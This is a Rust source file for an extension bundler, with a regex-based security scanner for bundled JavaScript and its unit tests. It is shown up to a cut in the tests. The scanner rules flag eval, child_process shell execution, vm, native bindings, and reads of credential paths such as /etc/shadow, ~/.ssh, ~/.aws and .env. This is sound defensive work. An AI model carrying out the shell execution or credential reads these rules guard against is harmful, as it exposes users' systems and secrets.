use std::{
    path::{Path, PathBuf},
    sync::OnceLock,
};

use sha2::Digest as _;

// ---------------------------------------------------------------------------
// Public types
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ExtensionType {
    Embed,
    Checkout,
    Blocks,
}

pub struct BundleResult {
    pub bytes: Vec<u8>,
    pub sha256: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Severity {
    Block,
    Warn,
}

#[derive(Debug)]
pub struct Finding {
    pub rule_id: &'static str,
    pub severity: Severity,
    pub message: &'static str,
    pub file: String,
    pub line: usize,
    pub snippet: String,
}

// ---------------------------------------------------------------------------
// Bundle security rules (SEC101–SEC110)
// Ported from src/core/security/rules/bundle/ in the TypeScript CLI.
// ---------------------------------------------------------------------------

struct RuleDef {
    id: &'static str,
    severity: Severity,
    description: &'static str,
    /// Main detection patterns.
    patterns: &'static [&'static str],
    /// Two-pass signal patterns: if non-empty and none match, skip this rule.
    signal_patterns: &'static [&'static str],
}

struct CompiledRule {
    id: &'static str,
    severity: Severity,
    description: &'static str,
    patterns: Vec<fancy_regex::Regex>,
    signal_patterns: Vec<fancy_regex::Regex>,
}

static RULE_DEFS: &[RuleDef] = &[
    // SEC101 — eval / Function constructor
    RuleDef {
        id: "SEC101",
        severity: Severity::Block,
        description: "Bundled code contains eval() or Function constructor which can execute arbitrary code",
        signal_patterns: &[],
        patterns: &[
            r#"(?m)(?:^|[^\w$])eval\s*\("#,
            r#"(?m)(?:^|[^\w$])new\s+Function\s*\("#,
            r#"(?:globalThis|window|self)\.eval\s*\("#,
            r#"(?:globalThis|window|self)\[['"]eval['"]\]\s*\("#,
            r#"\[['"]eval['"]\]\s*\("#,
            r#"\[['"]Function['"]\]\s*\("#,
            r#"(?:eval|Function|setTimeout|setInterval)\s*\(\s*(?:atob\([^)]*\)|Buffer\.from\([^,]+,\s*['"\x60]base64['"\x60]\))"#,
            r#"eval\s*\(\s*['"\x60](?:\\x[0-9A-Fa-f]{2}){8,}['"\x60]\s*\)"#,
        ],
    },
    // SEC102 — child_process (two-pass)
    RuleDef {
        id: "SEC102",
        severity: Severity::Block,
        description: "Bundled code imports and uses child_process module which can execute shell commands",
        signal_patterns: &[
            r#"require\s*\(\s*['"](?:node:)?child_process['"]\s*\)"#,
            r#"from\s*['"](?:node:)?child_process['"]"#,
            r#"import\s*\(\s*['"](?:node:)?child_process['"]\s*\)"#,
            r#"require_child_process\s*\("#,
            r#"__require\s*\(\s*['"]child_process['"]\s*\)"#,
            r#"\b[a-z]\s*\(\s*['"](?:node:)?child_process['"]\s*\)"#,
            r#"require\s*\(\s*['"](?:node:)?child['"]\s*\+\s*['"]_?process['"]\s*\)"#,
            r#"(?:require|import)\s*\(\s*(?:atob\([^)]*\)|Buffer\.from\([^,]+,\s*['"\x60]base64['"\x60]\)\.toString\(\))"#,
        ],
        patterns: &[
            r#"\bexec\s*\("#,
            r#"\bexecSync\s*\("#,
            r#"\bexecFile\s*\("#,
            r#"\bexecFileSync\s*\("#,
            r#"\bspawn\s*\("#,
            r#"\bspawnSync\s*\("#,
            r#"\bfork\s*\("#,
        ],
    },
    // SEC103 — vm module (two-pass)
    RuleDef {
        id: "SEC103",
        severity: Severity::Block,
        description: "Bundled code imports and uses vm module which enables arbitrary code execution",
        signal_patterns: &[
            r#"require\s*\(\s*['"](?:node:)?vm['"]\s*\)"#,
            r#"from\s*['"](?:node:)?vm['"]"#,
            r#"import\s*\(\s*['"](?:node:)?vm['"]\s*\)"#,
            r#"require_vm\s*\("#,
            r#"__require\s*\(\s*['"]vm['"]\s*\)"#,
        ],
        patterns: &[
            r#"\bScript\s*\("#,
            r#"\.runInNewContext\s*\("#,
            r#"\.runInContext\s*\("#,
            r#"\.runInThisContext\s*\("#,
            r#"\.createContext\s*\("#,
        ],
    },
    // SEC104 — process.binding / dlopen
    RuleDef {
        id: "SEC104",
        severity: Severity::Block,
        description: "Bundled code accesses Node.js internal bindings which can bypass security",
        signal_patterns: &[],
        patterns: &[
            r#"process\.binding\s*\("#,
            r#"process\._linkedBinding\s*\("#,
            r#"process\.dlopen\s*\("#,
            r#"internalBinding\s*\("#,
            r#"process\[['"]binding['"]\]\s*\("#,
            r#"process\[['"]_linkedBinding['"]\]\s*\("#,
            r#"process\[['"]dlopen['"]\]\s*\("#,
        ],
    },
    // SEC105 — native addons (two-pass)
    RuleDef {
        id: "SEC105",
        severity: Severity::Block,
        description: "Bundled code loads native addons which can bypass Node.js security",
        signal_patterns: &[
            r#"require\s*\(\s*['"]bindings['"]\s*\)"#,
            r#"require\s*\(\s*['"]node-gyp['"]\s*\)"#,
            r#"require\s*\(\s*['"]ffi-napi['"]\s*\)"#,
            r#"require\s*\(\s*['"]node-addon-api['"]\s*\)"#,
            r#"from\s*['"]bindings['"]"#,
            r#"from\s*['"]ffi-napi['"]"#,
            r#"require_bindings\s*\("#,
        ],
        patterns: &[
            r#"['"]\.node['"]"#,
            r#"\.node['"]\s*\)"#,
            r#"process\.dlopen\s*\("#,
        ],
    },
    // SEC106 — module monkey-patching (two-pass)
    RuleDef {
        id: "SEC106",
        severity: Severity::Block,
        description: "Bundled code modifies module system internals which can hijack dependencies",
        signal_patterns: &[
            r#"require\s*\(\s*['"]module['"]\s*\)"#,
            r#"from\s*['"]module['"]"#,
            r#"require_module\s*\("#,
        ],
        patterns: &[
            r#"Module\._load\s*="#,
            r#"Module\._resolveFilename\s*="#,
            r#"Module\._extensions\["#,
            r#"require\.cache\s*\["#,
            r#"delete\s+require\.cache"#,
            r#"Module\[['"]_load['"]\]\s*="#,
            r#"Module\[['"]_resolveFilename['"]\]\s*="#,
        ],
    },
    // SEC107 — inspector module (two-pass)
    RuleDef {
        id: "SEC107",
        severity: Severity::Block,
        description: "Bundled code uses inspector module which can enable remote debugging access",
        signal_patterns: &[
            r#"require\s*\(\s*['"](?:node:)?inspector['"]\s*\)"#,
            r#"from\s*['"](?:node:)?inspector['"]"#,
            r#"import\s*\(\s*['"](?:node:)?inspector['"]\s*\)"#,
            r#"require_inspector\s*\("#,
        ],
        patterns: &[
            r#"inspector\.open\s*\("#,
            r#"inspector\.url\s*\("#,
            r#"inspector\.waitForDebugger\s*\("#,
            r#"inspector\[['"]open['"]\]\s*\("#,
        ],
    },
    // SEC108 — external URLs (two-pass, warn)
    RuleDef {
        id: "SEC108",
        severity: Severity::Warn,
        description: "Bundled code contains HTTP(S) URLs to external domains",
        signal_patterns: &[
            r#"require\s*\(\s*['"](?:node:)?https?['"]\s*\)"#,
            r#"from\s*['"](?:node:)?https?['"]"#,
            r#"require\s*\(\s*['"]axios['"]\s*\)"#,
            r#"from\s*['"]axios['"]"#,
        ],
        patterns: &[
            r#"https?://[^\s"'\x60<>]+"#,
            r#"new\s+URL\s*\(\s*['"]https?:[^'"]+['"]\s*\)"#,
            r#"fetch\s*\(\s*['"]https?:[^'"]+['"]\s*\)"#,
        ],
    },
    // SEC109 — large encoded blobs (warn)
    RuleDef {
        id: "SEC109",
        severity: Severity::Warn,
        description: "Bundled code contains large base64/hex encoded data that could hide malicious payloads",
        signal_patterns: &[],
        patterns: &[
            r#"Buffer\.from\s*\(\s*['"][A-Za-z0-9+/]{200,}={0,2}['"]\s*,\s*['"]base64['"]\s*\)"#,
            r#"atob\s*\(\s*['"][A-Za-z0-9+/]{200,}={0,2}['"]\s*\)"#,
            r#"Buffer\.from\s*\(\s*['"][A-Fa-f0-9]{400,}['"]\s*,\s*['"]hex['"]\s*\)"#,
        ],
    },
    // SEC110 — sensitive fs/net/env ops (two-pass, warn)
    RuleDef {
        id: "SEC110",
        severity: Severity::Warn,
        description: "Bundled code accesses sensitive paths, environment variables, or network APIs",
        signal_patterns: &[
            r#"require\s*\(\s*['"](?:node:)?net['"]\s*\)"#,
            r#"from\s*['"](?:node:)?net['"]"#,
            r#"require\s*\(\s*['"](?:node:)?fs['"]\s*\)"#,
            r#"from\s*['"](?:node:)?fs['"]"#,
        ],
        patterns: &[
            r#"net\.connect\s*\("#,
            r#"net\.createConnection\s*\("#,
            r#"process\.env\["#,
            r#"process\.env\."#,
            r#"['"]/(etc/passwd|etc/shadow|\.ssh/|\.aws/)"#,
            r#"['"]~/\.ssh/"#,
            r#"fs\.readFile(?:Sync)?\s*\(\s*['"][^'"]*\.env['"]"#,
        ],
    },
    // SEC111 — destructive fs operations (two-pass, block)
    RuleDef {
        id: "SEC111",
        severity: Severity::Block,
        description: "Bundled code performs destructive filesystem operations (unlink/rm/rmdir)",
        signal_patterns: &[
            r#"require\s*\(\s*['"](?:node:)?fs['"]\s*\)"#,
            r#"from\s*['"](?:node:)?fs['"]"#,
            r#"require\s*\(\s*['"](?:node:)?fs/promises['"]\s*\)"#,
            r#"from\s*['"](?:node:)?fs/promises['"]"#,
            r#"require_fs\s*\("#,
        ],
        patterns: &[
            r#"\bunlink\s*\("#,
            r#"\bunlinkSync\s*\("#,
            r#"\brmdir\s*\("#,
            r#"\brmdirSync\s*\("#,
            r#"\brm\s*\("#,
            r#"\brmSync\s*\("#,
        ],
    },
    // SEC112 — requests to untrusted domains (no signal, block)
    RuleDef {
        id: "SEC112",
        severity: Severity::Block,
        description: "Bundled code makes requests to domains outside the GoDaddy trusted allowlist",
        signal_patterns: &[],
        patterns: &[
            r#"https?://(?!(?:(?:[a-zA-Z0-9-]+\.)*godaddy\.com|localhost|127\.0\.0\.1)(?:[:/?#\s]|$))[^\s"'\x60<>]+"#,
        ],
    },
    // SEC113 — any encoded payload (no signal, block)
    RuleDef {
        id: "SEC113",
        severity: Severity::Block,
        description: "Bundled code uses base64/hex encoding that could conceal malicious payloads",
        signal_patterns: &[],
        patterns: &[
            r#"\batob\s*\("#,
            r#"Buffer\.from\s*\(\s*['"][^'"]+['"]\s*,\s*['"](?:base64|hex)['"]"#,
        ],
    },
    // SEC114 — debugger statement (no signal, block)
    RuleDef {
        id: "SEC114",
        severity: Severity::Block,
        description: "Bundled code contains a debugger statement which enables remote debugging access",
        signal_patterns: &[],
        patterns: &[
            r#"\bdebugger\b"#,
        ],
    },
    // SEC115 — dynamic require/import (no signal, block)
    RuleDef {
        id: "SEC115",
        severity: Severity::Block,
        description: "Bundled code uses dynamic require() or import() with non-literal arguments",
        signal_patterns: &[],
        patterns: &[
            r#"\brequire\s*\(\s*(?!['"\x60])"#,
            r#"\bimport\s*\(\s*(?!['"\x60])"#,
        ],
    },
];

static COMPILED: OnceLock<Vec<CompiledRule>> = OnceLock::new();

fn compiled_rules() -> &'static [CompiledRule] {
    COMPILED.get_or_init(|| {
        RULE_DEFS
            .iter()
            .map(|def| CompiledRule {
                id: def.id,
                severity: def.severity,
                description: def.description,
                patterns: def
                    .patterns
                    .iter()
                    .map(|p| fancy_regex::Regex::new(p).expect("invalid bundle rule pattern"))
                    .collect(),
                signal_patterns: def
                    .signal_patterns
                    .iter()
                    .map(|p| fancy_regex::Regex::new(p).expect("invalid bundle signal pattern"))
                    .collect(),
            })
            .collect()
    })
}

// ---------------------------------------------------------------------------
// Scanner helpers
// ---------------------------------------------------------------------------

fn line_number(content: &str, byte_offset: usize) -> usize {
    content[..byte_offset]
        .bytes()
        .filter(|&b| b == b'\n')
        .count()
        + 1
}

fn extract_snippet(content: &str, byte_offset: usize) -> String {
    let line_start = content[..byte_offset]
        .rfind('\n')
        .map_or(0, |i| i + 1);
    let line_end = content[byte_offset..]
        .find('\n')
        .map_or(content.len(), |i| byte_offset + i);
    let line = &content[line_start..line_end];
    let pos = byte_offset - line_start;
    let ctx = 25_usize;
    let start = pos.saturating_sub(ctx);
    let end = (pos + ctx).min(line.len());
    line[start..end].trim().to_owned()
}

// ---------------------------------------------------------------------------
// Public scanner API
// ---------------------------------------------------------------------------

pub fn scan_bundle(content: &str, file_path: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    for rule in compiled_rules() {
        if !rule.signal_patterns.is_empty() {
            let signal_found = rule
                .signal_patterns
                .iter()
                .any(|re| re.is_match(content).unwrap_or(false));
            if !signal_found {
                continue;
            }
            for re in rule.signal_patterns.iter().chain(rule.patterns.iter()) {
                for m in re.find_iter(content).filter_map(|m| m.ok()) {
                    findings.push(Finding {
                        rule_id: rule.id,
                        severity: rule.severity,
                        message: rule.description,
                        file: file_path.to_owned(),
                        line: line_number(content, m.start()),
                        snippet: extract_snippet(content, m.start()),
                    });
                }
            }
        } else {
            for re in &rule.patterns {
                for m in re.find_iter(content).filter_map(|m| m.ok()) {
                    findings.push(Finding {
                        rule_id: rule.id,
                        severity: rule.severity,
                        message: rule.description,
                        file: file_path.to_owned(),
                        line: line_number(content, m.start()),
                        snippet: extract_snippet(content, m.start()),
                    });
                }
            }
        }
    }

    findings.sort_by_key(|f| f.line);
    findings
}

pub fn is_blocked(findings: &[Finding]) -> bool {
    findings.iter().any(|f| f.severity == Severity::Block)
}

// ---------------------------------------------------------------------------
// Bundler
// ---------------------------------------------------------------------------

fn find_esbuild() -> PathBuf {
    if let Ok(cwd) = std::env::current_dir() {
        let mut dir = cwd.as_path();
        loop {
            let candidate = dir.join("node_modules/.bin/esbuild");
            if candidate.exists() {
                return candidate;
            }
            match dir.parent() {
                Some(p) => dir = p,
                None => break,
            }
        }
    }
    PathBuf::from("esbuild")
}

pub async fn bundle_extension(
    source_path: &Path,
    ext_type: ExtensionType,
    ext_dir: &Path,
) -> Result<BundleResult, String> {
    let esbuild = find_esbuild();

    let millis = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis();
    let temp_dir = std::env::temp_dir().join(format!("godaddy-bundle-{millis}"));
    tokio::fs::create_dir_all(&temp_dir)
        .await
        .map_err(|e| format!("failed to create temp dir: {e}"))?;

    let mut args: Vec<String> = vec![
        source_path.to_string_lossy().into_owned(),
        "--bundle".to_owned(),
        "--minify".to_owned(),
        "--sourcemap=external".to_owned(),
        format!("--outdir={}", temp_dir.display()),
        "--out-extension:.js=.mjs".to_owned(),
        "--log-level=silent".to_owned(),
        "--external:node:*".to_owned(),
        "--external:@wsblocks/*".to_owned(),
    ];

    match ext_type {
        ExtensionType::Blocks => {
            args.push("--platform=node".to_owned());
            args.push("--format=esm".to_owned());
            args.push("--target=node22".to_owned());
            args.push("--external:react".to_owned());
            args.push("--external:react/*".to_owned());
            args.push("--external:react-dom".to_owned());
            args.push("--external:react-dom/*".to_owned());
        }
        ExtensionType::Embed | ExtensionType::Checkout => {
            args.push("--platform=browser".to_owned());
            args.push("--format=iife".to_owned());
            args.push("--target=es2020".to_owned());
            args.push("--alias:react=preact/compat".to_owned());
            args.push("--alias:react-dom=preact/compat".to_owned());
            args.push("--alias:react/jsx-runtime=preact/jsx-runtime".to_owned());
        }
    }

    let ext_node_modules = ext_dir.join("node_modules");
    if ext_node_modules.exists() {
        args.push(format!("--node-paths={}", ext_node_modules.display()));
    }

    let output = tokio::process::Command::new(&esbuild)
        .args(&args)
        .output()
        .await
        .map_err(|e| format!("failed to run esbuild ({}): {e}", esbuild.display()))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
        tokio::fs::remove_dir_all(&temp_dir).await.ok();
        return Err(format!("esbuild failed: {stderr}"));
    }

    let mjs_path = find_output_mjs(&temp_dir).await?;
    let raw_bytes = tokio::fs::read(&mjs_path)
        .await
        .map_err(|e| format!("failed to read bundle output: {e}"))?;

    // Strip sourcemap comment before hashing (matches TS behavior).
    let content = String::from_utf8_lossy(&raw_bytes);
    let stripped = strip_sourcemap_comment(&content);
    let sha256 = sha256_hex(stripped.as_bytes());
    let bytes = stripped.into_bytes();

    tokio::fs::remove_dir_all(&temp_dir).await.ok();

    Ok(BundleResult { bytes, sha256 })
}

async fn find_output_mjs(dir: &Path) -> Result<PathBuf, String> {
    let mut read_dir = tokio::fs::read_dir(dir)
        .await
        .map_err(|e| format!("failed to read temp dir: {e}"))?;
    while let Ok(Some(entry)) = read_dir.next_entry().await {
        let path = entry.path();
        if path.extension().and_then(|e| e.to_str()) == Some("mjs") {
            return Ok(path);
        }
    }
    Err("esbuild produced no .mjs output file".to_owned())
}

fn strip_sourcemap_comment(content: &str) -> String {
    let stripped: Vec<&str> = content
        .lines()
        .filter(|line| !line.trim_start().starts_with("//# sourceMappingURL="))
        .collect();
    stripped.join("\n").trim_end().to_owned()
}

fn sha256_hex(bytes: &[u8]) -> String {
    sha2::Sha256::digest(bytes)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // -----------------------------------------------------------------------
    // line_number helper
    // -----------------------------------------------------------------------

    #[test]
    fn line_number_first_line_start() {
        assert_eq!(line_number("hello", 0), 1);
    }

    #[test]
    fn line_number_first_line_end() {
        assert_eq!(line_number("hello", 4), 1);
    }

    #[test]
    fn line_number_second_line() {
        let s = "line1\nline2";
        assert_eq!(line_number(s, 6), 2);
    }

    #[test]
    fn line_number_third_line() {
        let s = "a\nb\nc";
        assert_eq!(line_number(s, 4), 3);
    }

    #[test]
    fn line_number_at_newline_char() {
        let s = "a\nb";
        assert_eq!(line_number(s, 1), 1);
    }

    #[test]
    fn line_number_crlf_counts_only_lf() {
        let s = "line1\r\nline2";
        assert_eq!(line_number(s, 7), 2);
    }

    #[test]
    fn line_number_empty_offset() {
        assert_eq!(line_number("", 0), 1);
    }

    // -----------------------------------------------------------------------
    // extract_snippet helper
    // -----------------------------------------------------------------------

    #[test]
    fn extract_snippet_short_line() {
        let s = r#"const x = eval("bad");"#;
        let snip = extract_snippet(s, 10);
        assert!(snip.contains("eval"), "snippet: {snip}");
    }

    #[test]
    fn extract_snippet_truncates_long_line() {
        let long = format!("{}MATCH{}", "a".repeat(40), "b".repeat(40));
        let pos = 40;
        let snip = extract_snippet(&long, pos);
        assert!(snip.contains("MATCH"), "snippet: {snip}");
        assert!(snip.len() <= 60, "snippet too long: {snip}");
    }

    #[test]
    fn extract_snippet_does_not_cross_newlines() {
        let s = "line1\neval(\"bad\")\nline3";
        let snip = extract_snippet(s, 6);
        assert!(snip.contains("eval"), "snippet: {snip}");
        assert!(!snip.contains("line1"), "leaked into prev line: {snip}");
        assert!(!snip.contains("line3"), "leaked into next line: {snip}");
    }

    #[test]
    fn extract_snippet_at_file_start() {
        let s = "eval(\"x\") + 1";
        let snip = extract_snippet(s, 0);
        assert!(snip.contains("eval"), "snippet: {snip}");
    }

    // -----------------------------------------------------------------------
    // strip_sourcemap_comment
    // -----------------------------------------------------------------------

    #[test]
    fn strip_removes_sourcemap_line() {
        let content = "const x = 1;\n//# sourceMappingURL=bundle.mjs.map\n";
        let result = strip_sourcemap_comment(content);
        assert!(!result.contains("sourceMappingURL"), "result: {result}");
        assert!(result.contains("const x = 1;"), "result: {result}");
    }

    #[test]
    fn strip_keeps_other_content_intact() {
        let content = "const a = 1;\nconst b = 2;\n";
        let result = strip_sourcemap_comment(content);
        assert!(result.contains("const a = 1;"), "result: {result}");
        assert!(result.contains("const b = 2;"), "result: {result}");
    }

    #[test]
    fn strip_no_sourcemap_is_noop() {
        let content = "const x = 1;";
        let result = strip_sourcemap_comment(content);
        assert!(result.contains("const x = 1;"), "result: {result}");
    }

    // -----------------------------------------------------------------------
    // sha256_hex
    // -----------------------------------------------------------------------

    #[test]
    fn sha256_empty_input() {
        let hex = sha256_hex(b"");
        assert_eq!(hex.len(), 64);
        assert_eq!(
            hex,
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
    }

    #[test]
    fn sha256_known_value() {
        let hex = sha256_hex(b"hello");
        assert_eq!(
            hex,
            "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
        );
    }

    // -----------------------------------------------------------------------
    // is_blocked
    // -----------------------------------------------------------------------

    #[test]
    fn is_blocked_empty_findings() {
        assert!(!is_blocked(&[]));
    }

    #[test]
    fn is_blocked_warn_only_returns_false() {
        let findings = vec![Finding {
            rule_id: "SEC108",
            severity: Severity::Warn,
            message: "test",
            file: "f.mjs".to_owned(),
            line: 1,
            snippet: String::new(),
        }];
        assert!(!is_blocked(&findings));
    }

    #[test]
    fn is_blocked_block_finding_returns_true() {
        let findings = vec![Finding {
            rule_id: "SEC101",
            severity: Severity::Block,
            message: "test",
            file: "f.mjs".to_owned(),
            line: 1,
            snippet: String::new(),
        }];
        assert!(is_blocked(&findings));
    }

    #[test]
    fn is_blocked_mixed_returns_true() {
        let findings = vec![
            Finding {
                rule_id: "SEC108",
                severity: Severity::Warn,
                message: "warn",
                file: "f.mjs".to_owned(),
                line: 1,
                snippet: String::new(),
            },
            Finding {
                rule_id: "SEC101",
                severity: Severity::Block,
                message: "block",
                file: "f.mjs".to_owned(),
                line: 2,
                snippet: String::new(),
            },
        ];
        assert!(is_blocked(&findings));
    }

    // -----------------------------------------------------------------------
    // scan_bundle: general
    // -----------------------------------------------------------------------

    #[test]
    fn scan_clean_content_no_findings() {
        let findings = scan_bundle("const x = 1 + 2;\nconsole.log(x);\n", "clean.mjs");
        assert!(findings.is_empty(), "expected no findings: {findings:?}");
    }

    #[test]
    fn scan_results_sorted_by_line() {
        let content = "eval(\"first\");\nclean;\neval(\"second\");";
        let findings = scan_bundle(content, "test.mjs");
        let lines: Vec<usize> = findings.iter().map(|f| f.line).collect();
        let mut sorted = lines.clone();
        sorted.sort_unstable();
        assert_eq!(lines, sorted, "findings not sorted by line");
    }

    // -----------------------------------------------------------------------
    // SEC101 — eval / Function constructor
    // -----------------------------------------------------------------------

    #[test]
    fn sec101_eval_call() {
        let findings = scan_bundle(r#"const x = eval("code");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC101"),
            "findings: {findings:?}"
        );
        assert!(is_blocked(&findings));
    }

    #[test]
    fn sec101_eval_with_whitespace() {
        let findings = scan_bundle(r#"x = eval ( "code" );"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC101"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec101_new_function_constructor() {
        let findings = scan_bundle(r#"const f = new Function("return 1");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC101"),
            "findings: {findings:?}"
        );
        assert!(is_blocked(&findings));
    }

    #[test]
    fn sec101_bracket_function_constructor() {
        let findings = scan_bundle(r#"const f = ["Function"]("return 1");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC101"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec101_globalthis_eval() {
        let findings = scan_bundle(r#"globalThis.eval("code");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC101"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec101_globalthis_bracket_eval() {
        let findings = scan_bundle(r#"globalThis["eval"]("code");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC101"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec101_window_eval() {
        let findings = scan_bundle(r#"window.eval("code");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC101"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec101_self_eval() {
        let findings = scan_bundle(r#"self.eval("code");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC101"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec101_eval_atob() {
        let findings = scan_bundle(r#"eval(atob("aGVsbG8="));"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC101"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec101_eval_buffer_base64() {
        let findings =
            scan_bundle(r#"eval(Buffer.from("aGVsbG8=", "base64"));"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC101"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec101_no_match_evaluation_variable() {
        let findings = scan_bundle(r#"const evaluation = "test";"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC101"),
            "unexpected SEC101: {findings:?}"
        );
    }

    #[test]
    fn sec101_no_match_word_boundary() {
        let findings = scan_bundle(r#"function fooeval(x) { return x; }"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC101"),
            "unexpected SEC101: {findings:?}"
        );
    }

    // -----------------------------------------------------------------------
    // SEC102 — child_process (two-pass)
    // -----------------------------------------------------------------------

    #[test]
    fn sec102_require_child_process_with_exec() {
        let content = r#"var cp = require("child_process"); cp.exec("ls");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC102"),
            "findings: {findings:?}"
        );
        assert!(is_blocked(&findings));
    }

    #[test]
    fn sec102_require_node_child_process_with_spawn() {
        let content = r#"var cp = require("node:child_process"); cp.spawn("ls");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC102"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec102_esm_import_with_exec() {
        let content = r#"import { exec } from "child_process"; exec("ls");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC102"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec102_dynamic_import_with_spawn() {
        let content = r#"const cp = await import("child_process"); cp.spawn("ls");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC102"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec102_bundler_helper_with_execsync() {
        let content = r#"var cp = require_child_process(); cp.execSync("ls");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC102"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec102_fork_detected() {
        let content = r#"var cp = require("child_process"); cp.fork("worker.js");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC102"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec102_exec_without_import_no_match() {
        let findings = scan_bundle(r#"const r = exec("ls");"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC102"),
            "SEC102 should not fire without import: {findings:?}"
        );
    }

    #[test]
    fn sec102_no_signal_skips_rule() {
        let findings = scan_bundle(r#"function fork() { return 1; }"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC102"),
            "SEC102 should not fire without import signal: {findings:?}"
        );
    }

    // -----------------------------------------------------------------------
    // SEC103 — vm module (two-pass)
    // -----------------------------------------------------------------------

    #[test]
    fn sec103_require_vm_with_script() {
        let content = r#"var vm = require("vm"); new vm.Script("code");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC103"),
            "findings: {findings:?}"
        );
        assert!(is_blocked(&findings));
    }

    #[test]
    fn sec103_require_node_vm_with_run() {
        let content = r#"var vm = require("node:vm"); vm.runInNewContext("1+1", {});"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC103"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec103_esm_import_vm_with_run_in_this_context() {
        let content = r#"import * as vm from "vm"; vm.runInThisContext("1+1");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC103"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec103_run_in_context() {
        let content = r#"var vm = require("vm"); ctx.runInContext("code");"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC103"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec103_create_context() {
        let content = r#"var vm = require("vm"); vm.createContext({});"#;
        let findings = scan_bundle(content, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC103"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec103_no_signal_skips_rule() {
        let findings = scan_bundle(r#"ctx.runInNewContext("1+1", {});"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC103"),
            "SEC103 should not fire without vm import: {findings:?}"
        );
    }

    // -----------------------------------------------------------------------
    // SEC104 — process.binding / dlopen (no signal required)
    // -----------------------------------------------------------------------

    #[test]
    fn sec104_process_binding() {
        let findings = scan_bundle(r#"process.binding("fs");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC104"),
            "findings: {findings:?}"
        );
        assert!(is_blocked(&findings));
    }

    #[test]
    fn sec104_process_linked_binding() {
        let findings = scan_bundle(r#"process._linkedBinding("crypto");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC104"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec104_process_dlopen() {
        let findings = scan_bundle(r#"process.dlopen(module, "binding.node");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC104"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec104_internal_binding() {
        let findings = scan_bundle(r#"const b = internalBinding("crypto");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC104"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec104_bracket_binding() {
        let findings = scan_bundle(r#"process["binding"]("fs");"#, "test.mjs");
        assert!(
            findings.iter().any(|f| f.rule_id == "SEC104"),
            "findings: {findings:?}"
        );
    }

    #[test]
    fn sec104_no_match_process_env() {
        let findings = scan_bundle(r#"const val = process.env.KEY;"#, "test.mjs");
        assert!(
            findings.iter().all(|f| f.rule_id != "SEC104"),
            "unexpected SEC104: {findings:?}"
        );
    }

